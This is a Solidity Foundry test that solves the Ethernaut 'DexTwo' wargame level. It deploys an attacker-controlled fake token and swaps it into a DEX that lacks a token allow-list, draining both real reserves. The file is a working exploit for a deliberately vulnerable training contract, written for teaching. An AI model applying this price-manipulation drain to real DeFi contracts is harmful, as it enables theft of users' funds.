// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/levels/DexTwo.sol";
import {IERC20} from "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts-08/token/ERC20/ERC20.sol";

/// Ethernaut #23 "DexTwo" → SC03 price manipulation + SC05 missing input validation
/// (`loopscale-oracle-spot-price` family). `swap()` dropped the token allow-list, so a
/// caller-controlled fake token sets the price ratio and drains BOTH real reserves. Win: both real
/// reserves == 0.
contract FakeToken is ERC20 {
    constructor() ERC20("Fake", "FAKE") {
        _mint(msg.sender, 1_000_000e18);
    }
}

contract DexTwoTest is Test {
    DexTwo dex;
    address token1;
    address token2;

    function setUp() public {
        dex = new DexTwo();
        SwappableTokenTwo t1 = new SwappableTokenTwo(address(dex), "T1", "T1", 110e18);
        SwappableTokenTwo t2 = new SwappableTokenTwo(address(dex), "T2", "T2", 110e18);
        token1 = address(t1);
        token2 = address(t2);
        dex.setTokens(token1, token2);
        IERC20(token1).approve(address(dex), 100e18);
        IERC20(token2).approve(address(dex), 100e18);
        dex.add_liquidity(token1, 100e18);
        dex.add_liquidity(token2, 100e18);
    }

    function test_solve_dexTwo() public {
        FakeToken fake = new FakeToken(); // we control its supply -> we control the price ratio
        fake.approve(address(dex), type(uint256).max);

        // seed the dex with 100 fake, then swap to drain token1 (price: amount*bal(to)/bal(from))
        fake.transfer(address(dex), 100e18);
        dex.swap(address(fake), token1, 100e18); // 100*100/100 = 100 -> token1 drained

        // dex now holds 200 fake; swap 200 to drain token2
        dex.swap(address(fake), token2, 200e18); // 200*100/200 = 100 -> token2 drained

        assertEq(IERC20(token1).balanceOf(address(dex)), 0, "token1 drained");
        assertEq(IERC20(token2).balanceOf(address(dex)), 0, "token2 drained");
    }
}
